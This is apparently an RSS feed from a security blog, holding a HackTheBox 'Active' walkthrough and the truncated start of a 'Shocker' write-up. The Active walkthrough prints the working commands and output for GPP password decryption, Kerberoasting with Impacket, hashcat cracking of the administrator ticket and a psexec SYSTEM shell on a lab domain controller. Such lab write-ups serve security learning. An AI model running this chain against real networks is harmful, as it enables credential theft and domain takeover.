<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Ef&#39;s log</title>
    <link>https://fahmifj.github.io/</link>
    <description>Recent content on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Active</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-active/</guid>
      <description>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</description>
      <content:encoded><![CDATA[<p>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Active Directory GPP</li>
<li>Kerberoasting</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notables ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can safely assume this is an Active Directory (as the box name implies).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 23:20 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.100
Host is up <span style="color:#f92672">(</span>0.072s latency<span style="color:#f92672">)</span>.

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-07-11 03:20:53Z<span style="color:#f92672">)</span>
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
3269/tcp  open   tcpwrapped
4915/tcp  closed frcs
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49169/tcp open   msrpc         Microsoft Windows RPC
49172/tcp open   msrpc         Microsoft Windows RPC
49180/tcp open   msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-11T03:21:48
|_  start_date: 2021-07-09T05:18:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 71.11 seconds
</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) as well as PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I&rsquo;ll consider these vulns as alternative methods and put them in separate post.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
<p>There is no zone transfer in this machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ dig axfr @10.10.10.100 10.10.10.100

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
;; global options: +cmd
; Transfer failed.
</code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ smbmap -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -H 10.10.10.100
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</code></pre></div><h4 id="replication-share">Replication Share</h4>
<p>The <code>Replication</code> share contains a lot of folders, so I&rsquo;ll just download them recursively.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
  active.htb                          D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>

                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5722238</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> recurse on
smb: <span style="color:#ae81ff">\&gt;</span> prompt of
smb: <span style="color:#ae81ff">\&gt;</span> mget * 
getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">23</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/GPT.INI <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ find . -type f -iname groups.xml                                                                            
./Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml
</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <code>active.htb\SVC_TGS</code>, and I&rsquo;ll note them,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ cat ./Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml
&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
&lt;Groups clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> changed<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> uid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U&#34;</span> newName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> fullName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> changeLogon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> noChange<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> neverExpires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> acctDisabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
&lt;/Groups&gt;
</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83»  
$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
dn:
namingContexts: DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
$ ldapsearch -LLL -x -h 10.10.10.100 -b <span style="color:#e6db74">&#34;dc=active,dc=htb&#34;</span> 
Operations error <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers. When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files created contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> which can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
GPPstillStandingStrong2k18
</code></pre></div><h4 id="users-share">Users Share</h4>
<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ crackmapexec smb active.htb -u <span style="color:#e6db74">&#39;SVC_TGS&#39;</span> -p <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.1 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:active.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> active.htb<span style="color:#ae81ff">\S</span>VC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               C$                              Default share
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               IPC$                            Remote IPC
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Replication     READ            
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Users           READ  
</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is most likely <code>C:\Users\</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
$ smbclient -N //10.10.10.100/Users -U <span style="color:#e6db74">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                  DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
  ..                                 DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
  Administrator                       D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">16</span> 06:14:21 <span style="color:#ae81ff">2018</span>
  All Users                       DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:38:21 <span style="color:#ae81ff">2009</span>
  Default User                    DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
  SVC_TGS                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>

                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5722238</span> blocks available
</code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">smb: \&gt; ls SVC_TGS\Desktop\
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

                10459647 blocks of size 4096. 5722238 blocks available
smb: \&gt; more SVC_TGS\Desktop\user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
</code></pre></div><p><img class="img-container" src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service.</p>
<p>It was found that the administrator has <code>servicePrincipalName</code> attribute.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
$ ldapsearch -LLL -x -D <span style="color:#e6db74">&#39;SVC_TGS@active.htb&#39;</span> -w <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span style="color:#e6db74">&#34;dc=active,dc=htb&#34;</span> <span style="color:#e6db74">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
dn: CN<span style="color:#f92672">=</span>Administrator,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb

...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
adminCount: <span style="color:#ae81ff">1</span>
accountExpires: <span style="color:#ae81ff">0</span>
logonCount: <span style="color:#ae81ff">34</span>
sAMAccountName: Administrator
sAMAccountType: <span style="color:#ae81ff">805306368</span>
servicePrincipalName: active/CIFS:445
objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
<p><strong>Kerberoasting</strong> is an attack against Kerberos to steal a Service Ticket. The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>.</p>
<p>The following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a> shows an overview of Kerberos authentication process. The red box indicates the <strong>Kerberoasting</strong> attack.</p>
<p><img class="img-container" src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  />
</p>
<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
<p>In the image above, step number 4, the client/user will obtains a Ticket Granting Service (TGS) ticket. This ticket is encrypted with NTLM hash (derived from password) of a service account. If the client itself has been compromised, an attacker could easily steal the ticket and attempt an offline brute-force to recover the password from the ticket.</p>
<p>For example, let&rsquo;s start from step 3 and say we want to access a CIFS service. The server (KDC) then searches for SPN of CIFS service, which in this case is <code>active/CIFS:445</code> and <strong>it is tied</strong> to the Administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash of the Administrator account and send the ticket to the client. Now that we have the TGS ticket, but instead of using the ticket to authenticate to the CIFS service, we keep that ticket and attempt a brute-force against it to obtain the administrator password.</p>
<blockquote>
<p>If the SPN is tied to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
</blockquote>
<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tools captures the ticket and automatically formats it into hashcat crackable format.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
$ impacket-GetUserSPNs active.htb/SVC_TGS:<span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
<p>The password of the TGS can be recovered using hashcat.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span style="color:#ae81ff">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...:Ticketmaster1968
</code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
<h4 id="impacket-psexec">Impacket-psexec</h4>
<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ impacket-psexec active.htb/administrator:<span style="color:#e6db74">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.100.....
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file olAAJsqj.exe
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.100.....
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service mvjR on 10.10.10.100.....
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service mvjR.....
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami <span style="color:#f92672">&amp;&amp;</span> ipconfig
nt authority<span style="color:#ae81ff">\s</span>ystem

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.<span style="color:#f92672">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span style="color:#f92672">}</span>:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
</code></pre></div><p>The root flag is done here.</p>
<pre><code>C:\Windows\system32&gt;type \Users\Administrator\Desktop\root.txt
b5fc76...[SNIP]...
</code></pre><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
<li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
<li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
<li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Shocker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
      <description>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance Nmap A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
      <content:encoded><![CDATA[<p>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploitation of Shellshock vulnerability</li>
<li>Exploitation of sudo privileges on perl</li>
</ul>
<h3 id="tools">Tools</h3>
